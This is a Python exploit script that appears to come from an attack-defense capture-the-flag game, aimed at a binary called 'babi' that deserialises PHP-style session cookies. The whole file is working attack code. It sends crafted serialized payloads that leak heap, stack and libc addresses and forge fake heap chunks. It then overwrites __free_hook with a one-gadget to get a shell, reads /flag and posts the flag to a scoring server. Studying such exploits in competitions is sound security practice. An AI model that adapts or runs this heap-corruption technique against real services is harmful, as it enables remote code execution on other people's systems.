#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './babi'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('local', 'remote')
env.set_item('mode',    local = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  local   = {'host':'localhost', 'port':47793}, \
                        remote  = {'host':'10.13.37.4', 'port':47793})
env.set_item('libc',    local   = None, \
                        remote  = None)
env.select('remote')

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#ofs = [0x2760, 0x1710]
#ofs = [0x2680, -0x3a90]
ofs = [0x2680, 0x1710]

#==========

def request(conn, serialize):
    req  = 'GET /info HTTP/1.1\r\n'
    req += 'Connection: Keep-alive\r\n'
    req += 'Cookie: session={}\r\n\r\n'.format(base64.b64encode(serialize))
    conn.send(req)

def leak_heap(conn, **kwargs):
    request(conn, 'a:1:{i:0;s:720:"%s";}' % (p64(0xdeadbeef)*2).ljust(720, 'x'))

    request(conn, 'a:2:{i:0;r:3;i:1;s:1:"a";}')
    conn.recvuntil('</html>')

    request(conn, 'a:1:{i:0;s:48:"%s";}' % p64(0).ljust(48, '\x00'))
    conn.recvuntil('string(48) "')

    leak = conn.recvuntil('"\n', drop=True).decode('utf-8').encode('latin-1')
    addr_heap   = u64(leak[0x8:0x10])
    addr_stack  = u64(leak[0x28:0x30])
    info('addr_heap         = 0x{:08x}'.format(addr_heap))
    info('addr_stack        = 0x{:08x}'.format(addr_stack))

    return addr_heap, addr_stack

def leak_libc(conn, **kwargs):
    addr_heap, addr_stack = kwargs['addrs']

    fake_chunks  = (p64(0)+p64(0x41)+p64(addr_heap+ofs[0]+0x40*1)).ljust(0x40, '\x11')
    fake_chunks += (p64(0)+p64(0x41)+p64(addr_heap+ofs[0]+0x40*2)).ljust(0x40, '\x11')
    fake_chunks += (p64(0)+p64(0x41)+p64(addr_heap+ofs[0]+0x40*3)).ljust(0x40, '\x11')
    fake_chunks += (p64(0)+p64(0x41)+p64(0)).ljust(0x40, '\x11')
    request(conn, 'a:1:{i:0;s:720:"%s";}' % fake_chunks.ljust(720, '\xff'))

    request(conn, 'a:2:{i:0;r:3;i:1;s:1:"a";}')
    conn.recvuntil('</html>')

    fake_chunks  = (p64(0)+p64(0x41)+p64(addr_heap+ofs[0]+0x40*1)).ljust(0x40, '\x11')
    fake_chunks += (p64(0)+p64(0x41)+p64(addr_heap+ofs[0]+0x40*2)).ljust(0x40, '\x11')
    fake_chunks += (p64(0)+p64(0x41)+p64(0x4)+p64(addr_heap+ofs[1])+p64(0x100)*2+p64(8)+p64(addr_stack)).ljust(0x40, '\x11')
    fake_chunks += (p64(0)+p64(0x41)+p64(0)).ljust(0x40, '\x11')
    request(conn, 'a:3:{i:0;s:48:"%s";i:1;s:48:"%s";i:2;s:720:"%s";}' % (p64(addr_heap+ofs[0]).ljust(48, '\x00'), '0'*48, fake_chunks.ljust(720, '\xff')))
    conn.recvuntil('string(256) "')

    leak = conn.recvuntil('"\n', drop=True).decode('utf-8').encode('latin-1')
    addr_libc_mainarena     = u64(leak[0x40:0x48]) - 0x60
    libc.address            = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

def attack(conn, **kwargs):
    addr_heap, addr_stack = kwargs['addrs']

    addr_libc_free_hook     = libc.symbols['__free_hook']
    addr_libc_onegadget     = libc.address + 0x4f322

    fake_chunks  = (p64(0)+p64(0x41)+p64(addr_libc_free_hook)).ljust(0x40, '\x11')
    fake_chunks += p64(0)+p64(0x21)
    request(conn, 'a:1:{i:0;s:720:"%s";}' % fake_chunks.ljust(720, '\xff'))

    request(conn, 'a:2:{i:0;r:3;i:1;s:1:"a";}')
    conn.recvuntil('</html>')

    request(conn, 'a:2:{i:0;s:48:"%s";i:1;s:48:"%s";}' % (p64(addr_heap+ofs[0]).ljust(48, '\x00'), p64(addr_libc_onegadget).ljust(48)))
    conn.recvuntil('</html>')

def post_flag(flag):
    import requests

    response = requests.post('http://10.13.37.16/api/submit_flag/{}'.format(flag))
    print(response.text)

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    x = comn.run(leak_heap)
    comn.connection.close()

    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(leak_libc, addrs = x)
    comn.connection.close()

    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack, addrs = x)

    if env.check('remote'):
        comn.connection.sendline('cat /flag')
        flag = comn.connection.recv(48)
        print 'flag : {}'.format(flag)
        post_flag(flag)
    else:
        comn.connection.interactive()

#==========
